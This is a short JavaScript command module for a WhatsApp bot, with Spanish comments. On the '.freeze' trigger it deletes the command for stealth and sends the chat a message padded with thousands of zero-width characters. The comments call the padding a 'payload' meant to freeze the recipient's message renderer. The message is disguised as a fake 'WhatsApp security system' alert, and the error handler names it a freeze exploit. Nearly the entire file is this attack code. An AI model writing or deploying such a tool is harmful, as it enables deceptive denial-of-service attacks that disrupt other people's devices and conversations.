export default {
    name: 'ui_freezer',
    match: (text) => /^\.freeze/i.test(text),
    execute: async ({ sock, remitente, msg }) => {
        
        try {
            // 1. Sigilo: Borramos el comando
            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}

            // 2. Construcción del 'Payload' de saturación
            // Usamos caracteres combinados que obligan al motor de texto a recalcular
            // la posición de los glifos infinitamente.
            const veneno = ("\u0020\u200B".repeat(15000)); 
            
            // 3. Empaquetado agresivo
            // Enviamos un mensaje que parece inofensivo pero lleva la carga oculta
            await sock.sendMessage(remitente, {
                text: `¡Cuidado con esto! ⚡\n` + veneno,
                contextInfo: {
                    externalAdReply: {
                        title: "SISTEMA DE SEGURIDAD WHATSAPP",
                        body: "Error de renderizado detectado en el terminal.",
                        mediaType: 1,
                        thumbnail: Buffer.alloc(0),
                        sourceUrl: "https://", // Enlace nulo para no dar pistas
                        showAdAttribution: false
                    }
                }
            });

        } catch (err) {
            console.error("Error en el exploit de congelamiento:", err);
        }
    }
};
